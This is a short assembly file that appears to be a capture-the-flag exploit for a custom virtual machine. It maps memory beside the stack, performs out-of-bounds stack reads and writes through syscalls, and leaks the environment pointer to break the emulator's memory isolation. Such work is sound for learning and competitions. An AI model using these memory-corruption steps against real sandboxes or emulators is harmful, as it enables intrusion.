; hello.asm
.section .text
_start:
    call pwn
    mov $r1, get_pwned
    call puts
    hlt

pwn:

    ; allocate another section
    ; after stack
    mov     $r1, #0x1000      ; size
    mov     $r2, #0xf00db000  ; addr
    mov     $r5, #3           ; flags
    mov     $r0, SYS_MAP
    syscall

    ; oob stack read
    mov     $r1, #1 ; stdout
    mov     $r2, #0xcafe5ff0
    mov     $r5, #0x50
    mov     $r0, SYS_WRITE
    syscall


    ; oob stack write
    mov     $r1, #0 ; stdin
    mov     $r2, #0xcafe5ff0
    mov     $r5, #0x50
    mov     $r0, SYS_READ
    syscall
    
    mov     $r1, #1 ; stdout
    mov     $r2, #0xf00db000
    mov     $r5, #0x8
    mov     $r0, SYS_WRITE
    syscall

    ; oob stack write
    mov     $r1, #0 ; stdin
    mov     $r2, #0xcafe5ff0
    mov     $r5, #0x50
    mov     $r0, SYS_READ
    syscall

    ; leak environ
    mov     $r1, #1 ; stdout
    mov     $r2, #0xf00db000
    mov     $r5, #0x8
    mov     $r0, SYS_WRITE
    syscall


    ; oob stack write
    mov     $r1, #0 ; stdin
    mov     $r2, #0xcafe5ff0
    mov     $r5, #0x50
    mov     $r0, SYS_READ
    syscall

    ; leak environ
    mov     $r1, #0 ; stdin
    mov     $r2, #0xf00db000
    mov     $r5, #0x400
    mov     $r0, SYS_READ
    syscall


    ret

.section .data
get_pwned:
    .asciz "pwn3d"
